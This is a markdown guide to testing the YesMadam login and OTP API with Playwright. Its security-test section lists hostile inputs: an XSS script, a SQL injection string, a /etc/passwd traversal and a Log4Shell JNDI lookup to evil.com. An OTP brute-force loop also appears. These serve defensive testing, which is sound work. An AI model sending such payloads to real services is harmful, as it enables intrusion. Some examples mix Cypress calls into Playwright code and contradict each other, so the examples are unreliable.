# YesMadam API Testing Guide - Playwright

This comprehensive guide covers API testing best practices, patterns, and examples specifically for the YesMadam API testing framework using Playwright.

## Table of Contents

- [API Testing Fundamentals](#api-testing-fundamentals)
- [Authentication Testing](#authentication-testing)
- [Test Structure](#test-structure)
- [API Helper Usage](#api-helper-usage)
- [Data Management](#data-management)
- [Assertions and Validations](#assertions-and-validations)
- [Error Handling](#error-handling)
- [Performance Testing](#performance-testing)
- [Best Practices](#best-practices)

## API Testing Fundamentals

### YesMadam API Endpoints

The YesMadam API follows a specific structure for authentication and user management:

```typescript
import { test, expect } from '@playwright/test';
import { ApiHelper } from '../../utils/apiHelper';

test.describe('YesMadam API Fundamentals', () => {
  test('POST /v3/userapi/login - Mobile number validation', async ({ request }) => {
    const loginRequest = {
      mobile: testData.validUser.mobile
    };

    const response = await ApiHelper.post(request, '/v3/userapi/login', loginRequest);

    expect(response.status).toBe(200);
    expect(response.body.status).toBe('success');
    expect(response.body.message).toContain('otp verification');
  });

  test('POST /v3/userapi/otp/verification - OTP verification', async ({ request }) => {
    const otpRequest = {
      mobile: testData.validUser.mobile,
      otp: testData.validUser.otp
    };

    const response = await ApiHelper.post(request, '/v3/userapi/otp/verification', otpRequest);

    expect(response.status).toBe(200);
    expect(response.body.status).toBe('success');
    expect(response.body.object).toHaveProperty('user_id');
  });
});
```

### Response Structure Validation

```javascript
describe('Response Structure Validation', () => {
  it('should validate login response structure', () => {
    cy.apiRequest({
      method: 'POST',
      url: '/v3/userapi/login',
      body: { mobile: testData.validUser.mobile }
    }).then((response) => {
      // Validate required fields
      expect(response.body).to.have.property('status_code');
      expect(response.body).to.have.property('status');
      expect(response.body).to.have.property('message');
      expect(response.body).to.have.property('object');
      expect(response.body).to.have.property('token');
      expect(response.body).to.have.property('object2');

      // Validate data types
      expect(response.body.status_code).to.be.a('number');
      expect(response.body.status).to.be.a('string');
      expect(response.body.message).to.be.a('string');
    });
  });

  it('should validate OTP verification response structure', () => {
    cy.apiRequest({
      method: 'POST',
      url: '/v3/userapi/otp/verification',
      body: {
        mobile: testData.validUser.mobile,
        otp: testData.validUser.otp
      }
    }).then((response) => {
      // Validate OTP response fields
      expect(response.body).to.have.property('status_code');
      expect(response.body).to.have.property('status');
      expect(response.body).to.have.property('message');
      expect(response.body).to.have.property('object');

      // Validate user object structure
      expect(response.body.object).to.have.property('user_id');
      expect(response.body.object).to.have.property('mobile');
    });
  });
});
```

## Test Structure

### YesMadam Test Organization

```
tests/api/
├── auth/
│   ├── login.spec.ts              # Login endpoint tests
│   ├── otpVerification.spec.ts    # OTP verification tests
│   ├── completeAuthFlow.spec.ts   # End-to-end authentication
│   └── otpVerifications.spec.ts   # Additional OTP scenarios
├── user/
│   ├── profile.spec.ts            # User profile tests
│   └── userManagement.spec.ts     # User management tests
└── performance/
    └── apiPerformance.spec.ts     # Performance tests
```

### Test File Naming Convention

- `featureName.spec.ts` - Main test files (e.g., `login.spec.ts`)
- `completeFeatureFlow.spec.ts` - End-to-end workflow tests
- `featureValidation.spec.ts` - Input validation tests
- `featurePerformance.spec.ts` - Performance tests

### Test Structure

```typescript
import { test, expect } from '@playwright/test';
import { ApiHelper } from '../../utils/apiHelper';
import { ResponseValidator } from '../../utils/responseValidator';
import { Logger } from '../../utils/logger';

test.describe('Authentication API - Login', () => {
  let testData: any;
  let schemas: any;

  test.beforeAll(async () => {
    const fs = require('fs');
    testData = JSON.parse(fs.readFileSync('tests/fixtures/testData.json', 'utf-8'));
    schemas = JSON.parse(fs.readFileSync('tests/fixtures/schemas.json', 'utf-8'));
  });

  test('should successfully send OTP for valid mobile number', async ({ request }) => {
    Logger.info('Testing login endpoint with valid mobile number');

    const response = await ApiHelper.post(request, '/v3/userapi/login', {
      mobile: testData.validUser.mobile
    });

    // Test implementation
  });
});
```

## API Helper Usage

### YesMadam API Helper Methods

```typescript
import { ApiHelper } from '../../utils/apiHelper';

// Basic API request using ApiHelper
test('Basic API request', async ({ request }) => {
  const response = await ApiHelper.post(request, '/v3/userapi/login', {
    mobile: testData.validUser.mobile
  });

  expect(response.status).toBe(200);
  expect(response.body.status).toBe('success');
});

// GET request
test('GET request example', async ({ request }) => {
  const response = await ApiHelper.get(request, '/v3/userapi/profile', {
    'Authorization': 'Bearer ' + authToken
  });

  expect(response.status).toBe(200);
});

// PUT request
test('PUT request example', async ({ request }) => {
  const response = await ApiHelper.put(request, '/v3/userapi/profile', {
    name: 'Updated Name'
  });

  expect(response.status).toBe(200);
});

// DELETE request
test('DELETE request example', async ({ request }) => {
  const response = await ApiHelper.delete(request, '/v3/userapi/profile');

  expect(response.status).toBe(200);
});
```

### Response Validation

```typescript
import { ResponseValidator } from '../../utils/responseValidator';

test('Response validation example', async ({ request }) => {
  const response = await ApiHelper.post(request, '/v3/userapi/login', {
    mobile: testData.validUser.mobile
  });

  // Validate status code
  ResponseValidator.validateStatusCode(response, 200);

  // Validate response time (3 seconds max)
  ResponseValidator.validateResponseTime(response, 3000);

  // Validate required fields exist
  ResponseValidator.validateBodyHasKeys(response.body, [
    'status_code', 'status', 'message', 'object', 'token', 'object2'
  ]);

  // Validate specific values
  ResponseValidator.validateBodyProperty(response.body, 'status', 'success');
  ResponseValidator.validateBodyProperty(response.body, 'status_code', 401);

  // Validate data types
  ResponseValidator.validateBodyPropertyType(response.body, 'status_code', 'number');
  ResponseValidator.validateBodyPropertyType(response.body, 'status', 'string');
});
```

### Error Handling with API Helper

```typescript
test('Error handling example', async ({ request }) => {
  try {
    const response = await ApiHelper.makeRequest(request, {
      url: '/v3/userapi/login',
      method: 'POST',
      body: { mobile: 1234567 }, // Invalid mobile
      failOnStatusCode: false,
    });

    // Handle expected errors gracefully
    expect([200, 400, 401, 422]).toContain(response.status);
    Logger.info(`Response status for invalid mobile: ${response.status}`);
  } catch (error) {
    Logger.warning('Request failed as expected for invalid mobile number');
  }
});
```

## Data Management

### YesMadam Test Data Structure

```typescript
import * as fs from 'fs';

test.describe('Data Management', () => {
  test.beforeAll(async () => {
    // Load test data from fixtures
    testData = JSON.parse(fs.readFileSync('tests/fixtures/testData.json', 'utf-8'));
    schemas = JSON.parse(fs.readFileSync('tests/fixtures/schemas.json', 'utf-8'));
  });

  test('should use valid user data', async ({ request }) => {
    const requestBody = {
      mobile: testData.validUser.mobile
    };

    const response = await ApiHelper.post(request, '/v3/userapi/login', requestBody);
    // Test implementation
  });
});
```

### Test Data Files

#### `tests/fixtures/testData.json`
```json
{
  "validUser": {
    "mobile": 9855566677,
    "otp": 2222
  },
  "invalidUser": {
    "mobile": 1234567890,
    "otp": 9999
  },
  "endpoints": {
    "login": "/v3/userapi/login",
    "otpVerification": "/v3/userapi/otp/verification"
  },
  "expectedResponses": {
    "login": {
      "status_code": 401,
      "status": "success",
      "message": "move on otp verification page"
    }
  }
}
```

#### `tests/fixtures/schemas.json`
```json
{
  "loginResponseSchema": {
    "status_code": "number",
    "status": "string",
    "message": "string",
    "object": "object",
    "token": "object",
    "object2": "object"
  },
  "otpVerificationResponseSchema": {
    "status_code": "number",
    "status": "string",
    "message": "string",
    "object": "object"
  }
}
```

## Assertions and Validations

### YesMadam Response Assertions

```typescript
test.describe('Authentication Response Assertions', () => {
  test('should validate login response structure', async ({ request }) => {
    const response = await ApiHelper.post(request, '/v3/userapi/login', {
      mobile: testData.validUser.mobile
    });

    // Basic response assertions
    expect(response.status).toBe(200);
    expect(response.body).toBeInstanceOf(Object);
    expect(response.duration).toBeLessThan(3000);

    // Login-specific assertions
    expect(response.body.status_code).toBe(401);
    expect(response.body.status).toBe('success');
    expect(response.body.message).toContain('otp verification');

    // Object structure validation
    expect(response.body.object).toBeInstanceOf(Object);
    expect(response.body.token).toBeInstanceOf(Object);
    expect(response.body.object2).toBeInstanceOf(Object);
  });

  test('should validate OTP verification response', async ({ request }) => {
    const response = await ApiHelper.post(request, '/v3/userapi/otp/verification', {
      mobile: testData.validUser.mobile,
      otp: testData.validUser.otp
    });

    // OTP response assertions
    expect(response.body.status_code).toBe(0);
    expect(response.body.status).toBe('success');

    // User object validation
    expect(response.body.object).toBeInstanceOf(Object);
    expect(response.body.object).toHaveProperty('user_id');
    expect(response.body.object).toHaveProperty('mobile');
    expect(response.body.object).toHaveProperty('email');

    // Auth token validation
    expect(response.body.message).toBeTypeOf('string');
    expect(response.body.message.length).toBeGreaterThan(0);
  });
});
```

### Schema Validation

```typescript
test.describe('Schema Validation', () => {
  test('should validate login response schema', async ({ request }) => {
    const response = await ApiHelper.post(request, '/v3/userapi/login', {
      mobile: testData.validUser.mobile
    });

    ResponseValidator.validateSchema(response.body, schemas.loginResponseSchema);
  });

  test('should validate OTP response schema', async ({ request }) => {
    const response = await ApiHelper.post(request, '/v3/userapi/otp/verification', {
      mobile: testData.validUser.mobile,
      otp: testData.validUser.otp
    });

    ResponseValidator.validateSchema(response.body, schemas.otpVerificationResponseSchema);

    // Additional user object schema validation
    ResponseValidator.validateSchema(response.body.object, schemas.userObjectSchema);
  });
});
```

## Error Handling

### YesMadam Error Scenarios

```typescript
test.describe('Authentication Error Handling', () => {
  test('should handle invalid mobile number format', async ({ request }) => {
    const response = await ApiHelper.makeRequest(request, {
      url: '/v3/userapi/login',
      method: 'POST',
      body: { mobile: 1234567 }, // Invalid format
      failOnStatusCode: false,
    });

    // Should handle gracefully
    expect([200, 400, 401, 422]).toContain(response.status);
    Logger.info(`Response status for invalid mobile: ${response.status}`);
  });

  test('should handle missing mobile number', async ({ request }) => {
    const response = await ApiHelper.makeRequest(request, {
      url: '/v3/userapi/login',
      method: 'POST',
      body: {}, // Missing mobile field
      failOnStatusCode: false,
    });

    expect([200, 400, 422]).toContain(response.status);
    Logger.info('Missing field validation working as expected');
  });

  test('should handle incorrect OTP', async ({ request }) => {
    const response = await ApiHelper.makeRequest(request, {
      url: '/v3/userapi/otp/verification',
      method: 'POST',
      body: {
        mobile: testData.validUser.mobile,
        otp: 9999 // Wrong OTP
      },
      failOnStatusCode: false,
    });

    expect([200, 400, 401]).toContain(response.status);
    Logger.warning('Incorrect OTP handled appropriately');
  });
});
```

### Network and Timeout Handling

```javascript
describe('Network Error Handling', () => {
  it('should handle API timeouts', () => {
    ApiHelper.makeRequest({
      url: '/v3/userapi/login',
      method: 'POST',
      body: { mobile: testData.validUser.mobile },
      timeout: 1, // Very short timeout
      failOnStatusCode: false
    }).then((response) => {
      // Should handle timeout gracefully
      if (response.duration >= 1) {
        Logger.warning('Request timed out as expected');
      }
    });
  });

  it('should validate response time limits', () => {
    ApiHelper.post('/v3/userapi/login', {
      mobile: testData.validUser.mobile
    }).then((response) => {
      ResponseValidator.validateResponseTime(response, 5000);
      Logger.success(`Response time: ${response.duration}ms`);
    });
  });
});
```

## Performance Testing

### YesMadam Performance Requirements

```typescript
test.describe('Authentication Performance Tests', () => {
  test('should respond within acceptable time for login', async ({ request }) => {
    const response = await ApiHelper.post(request, '/v3/userapi/login', {
      mobile: testData.validUser.mobile
    });

    // Should respond within 3 seconds
    ResponseValidator.validateResponseTime(response, 3000);

    Logger.success(`Login response time: ${response.duration}ms`);
    console.log(`⚡ Response time: ${response.duration}ms`);
  });

  test('should validate OTP verification performance', async ({ request }) => {
    const response = await ApiHelper.post(request, '/v3/userapi/otp/verification', {
      mobile: testData.validUser.mobile,
      otp: testData.validUser.otp
    });

    // Should respond within 2 seconds
    ResponseValidator.validateResponseTime(response, 2000);

    Logger.success(`OTP verification time: ${response.duration}ms`);
  });

  test('should validate complete authentication flow performance', async ({ request }) => {
    const startTime = Date.now();

    await ApiHelper.post(request, '/v3/userapi/otp/verification', {
      mobile: testData.validUser.mobile,
      otp: testData.validUser.otp
    });

    const totalTime = Date.now() - startTime;

    // Complete flow should be under 5 seconds
    expect(totalTime).toBeLessThan(5000);

    Logger.success(`Complete auth flow: ${totalTime}ms`);
  });
});
```

## Security Testing

### YesMadam Authentication Security

```javascript
describe('Authentication Security Tests', () => {
  it('should validate mobile number format security', () => {
    // Test various mobile number formats
    const testCases = [
      { mobile: '123', expectedError: true },
      { mobile: 'abcdefghijk', expectedError: true },
      { mobile: '12345678901', expectedError: true },
      { mobile: '1234567890', expectedError: false }
    ];

    testCases.forEach((testCase) => {
      cy.apiRequest({
        method: 'POST',
        url: '/v3/userapi/login',
        body: { mobile: testCase.mobile },
        failOnStatusCode: false
      }).then((response) => {
        if (testCase.expectedError) {
          expect([400, 422]).to.include(response.status);
        } else {
          expect(response.status).to.eq(200);
        }
      });
    });
  });

  it('should handle OTP brute force protection', () => {
    const mobile = testData.validUser.mobile;

    // Attempt multiple wrong OTPs
    for (let i = 0; i < 5; i++) {
      cy.apiRequest({
        method: 'POST',
        url: '/v3/userapi/otp/verification',
        body: { mobile: mobile, otp: 9999 },
        failOnStatusCode: false
      }).then((response) => {
        // Should handle gracefully without server crash
        expect(response.status).to.not.eq(500);
      });
    }
  });
});
```

### Input Validation Security

```javascript
describe('Input Validation Security', () => {
  it('should handle malicious input safely', () => {
    const maliciousInputs = [
      { mobile: '<script>alert("xss")</script>' },
      { mobile: "'; DROP TABLE users; --" },
      { mobile: '../../../etc/passwd' },
      { mobile: '${jndi:ldap://evil.com/a}' }
    ];

    maliciousInputs.forEach((input) => {
      cy.apiRequest({
        method: 'POST',
        url: '/v3/userapi/login',
        body: input,
        failOnStatusCode: false
      }).then((response) => {
        // Should not crash server
        expect(response.status).to.not.eq(500);
        // Should return validation error
        expect([400, 422]).to.include(response.status);
      });
    });
  });

  it('should validate input length limits', () => {
    // Test extremely long input
    const longMobile = '1'.repeat(50);

    cy.apiRequest({
      method: 'POST',
      url: '/v3/userapi/login',
      body: { mobile: longMobile },
      failOnStatusCode: false
    }).then((response) => {
      expect([400, 422]).to.include(response.status);
    });
  });
});
```

## Best Practices

### 1. YesMadam Test Organization

- **Group by API endpoint**: `login.spec.ts`, `otpVerification.spec.ts`
- **Use descriptive test names**: `should successfully send OTP for valid mobile number`
- **Separate test types**: Unit tests, integration tests, performance tests
- **Use test.describe()**: Organize tests with `test.describe()` blocks

### 2. YesMadam Data Management

- **Use fixture files**: `testData.json` and `schemas.json`
- **Leverage test data structure**: `testData.validUser.mobile`, `testData.validUser.otp`
- **Environment-specific data**: Different data per environment
- **Dynamic data generation**: Use random mobile numbers when needed

### 3. YesMadam Assertions

- **Multi-layer validation**: Status code → Response structure → Business logic
- **Use ResponseValidator**: `ResponseValidator.validateStatusCode(response, 200)`
- **Schema validation**: `ResponseValidator.validateSchema(response.body, schema)`
- **Performance validation**: `ResponseValidator.validateResponseTime(response, 3000)`
- **Playwright assertions**: Use `expect().toBe()`, `expect().toContain()`, etc.

### 4. YesMadam Error Handling

- **Graceful degradation**: Use `failOnStatusCode: false` for expected errors
- **Comprehensive logging**: Use `Logger.info()`, `Logger.error()`, `Logger.success()`
- **Error context**: Log request details with errors
- **Test failure handling**: Proper error catching and reporting

### 5. YesMadam Performance

- **Response time limits**: Login < 3s, OTP verification < 2s, Complete flow < 5s
- **Timeout configuration**: Environment-specific timeouts
- **Performance monitoring**: Track response times in reports
- **Load testing**: Validate concurrent authentication requests

### 6. YesMadam Security

- **Input validation**: Test mobile number format validation
- **OTP security**: Test OTP expiration and attempt limits
- **Rate limiting**: Validate API rate limiting behavior
- **Error information**: Ensure errors don't leak sensitive information

### 7. YesMadam Maintainability

- **Use ApiHelper**: `ApiHelper.post()`, `ApiHelper.get()`, etc.
- **TypeScript support**: Leverage TypeScript for better type safety
- **Utility classes**: `Logger`, `ResponseValidator`
- **Clear documentation**: Document complex authentication flows

## Examples

### Complete YesMadam Authentication Test

```typescript
import { test, expect } from '@playwright/test';
import { ApiHelper } from '../../utils/apiHelper';
import { ResponseValidator } from '../../utils/responseValidator';
import { Logger } from '../../utils/logger';
import * as fs from 'fs';

test.describe('Complete Authentication Flow', () => {
  let testData: any;
  let schemas: any;

  test.beforeAll(async () => {
    testData = JSON.parse(fs.readFileSync('tests/fixtures/testData.json', 'utf-8'));
    schemas = JSON.parse(fs.readFileSync('tests/fixtures/schemas.json', 'utf-8'));
  });

  test.describe('End-to-End Login Flow', () => {
    test('should complete full authentication flow', async ({ request }) => {
      Logger.info('Starting complete authentication flow');

      // Step 1: Login with mobile number
      const loginResponse = await ApiHelper.post(request, '/v3/userapi/login', {
        mobile: testData.validUser.mobile,
      });

      // Validate login response
      expect(loginResponse.status).toBe(200);
      expect(loginResponse.body.status).toBe('success');
      expect(loginResponse.body.message).toContain('otp verification');

      Logger.success('Step 1: Login successful - OTP sent');

      // Step 2: Verify OTP
      const otpResponse = await ApiHelper.post(request, '/v3/userapi/otp/verification', {
        mobile: testData.validUser.mobile,
        otp: testData.validUser.otp,
      });

      // Validate OTP verification response
      expect(otpResponse.status).toBe(200);
      expect(otpResponse.body.status_code).toBe(0);
      expect(otpResponse.body.status).toBe('success');

      // Validate auth token
      const authToken = otpResponse.body.message;
      expect(authToken).toBeTypeOf('string');
      expect(authToken.length).toBeGreaterThan(0);

      // Validate user details
      expect(otpResponse.body.object).toHaveProperty('user_id');
      expect(otpResponse.body.object).toHaveProperty('email');
      expect(otpResponse.body.object).toHaveProperty('mobile');

      Logger.success('Step 2: OTP verification successful');
      Logger.success('Complete authentication flow passed');
    });
  });
});
```

### Individual Endpoint Test Example

```typescript
import { test, expect } from '@playwright/test';
import { ApiHelper } from '../../utils/apiHelper';
import { ResponseValidator } from '../../utils/responseValidator';
import { Logger } from '../../utils/logger';
import * as fs from 'fs';

test.describe('Authentication API - Login', () => {
  let testData: any;
  let schemas: any;

  test.beforeAll(async () => {
    testData = JSON.parse(fs.readFileSync('tests/fixtures/testData.json', 'utf-8'));
    schemas = JSON.parse(fs.readFileSync('tests/fixtures/schemas.json', 'utf-8'));
  });

  test.describe('POST /v3/userapi/login', () => {
    test('should successfully send OTP for valid mobile number', async ({ request }) => {
      Logger.info('Testing login endpoint with valid mobile number');

      const response = await ApiHelper.post(request, '/v3/userapi/login', {
        mobile: testData.validUser.mobile,
      });

      // Validate status code
      ResponseValidator.validateStatusCode(response, 200);

      // Validate response time
      ResponseValidator.validateResponseTime(response, 3000);

      // Validate response body structure
      ResponseValidator.validateBodyHasKeys(response.body, [
        'status_code',
        'status',
        'message',
        'object',
        'token',
        'object2',
      ]);

      // Validate specific values
      ResponseValidator.validateBodyProperty(response.body, 'status_code', 401);
      ResponseValidator.validateBodyProperty(response.body, 'status', 'success');
      ResponseValidator.validateBodyProperty(
        response.body,
        'message',
        'move on otp verification page'
      );

      // Validate schema
      ResponseValidator.validateSchema(response.body, schemas.loginResponseSchema);

      Logger.success('Login API test passed successfully');
    });

    test('should handle invalid mobile number gracefully', async ({ request }) => {
      Logger.info('Testing login with invalid mobile number');

      const response = await ApiHelper.makeRequest(request, {
        url: '/v3/userapi/login',
        method: 'POST',
        body: { mobile: 1234567 }, // Invalid mobile number
        failOnStatusCode: false,
      });

      // Validate that response is received (status code may vary)
      expect([200, 400, 401, 422]).toContain(response.status);

      Logger.info(`Response status for invalid mobile: ${response.status}`);
    });
  });
});
```

This guide provides comprehensive coverage of YesMadam API testing practices and patterns using Playwright. For more specific examples, refer to the test files in the `tests/api/auth/` directory.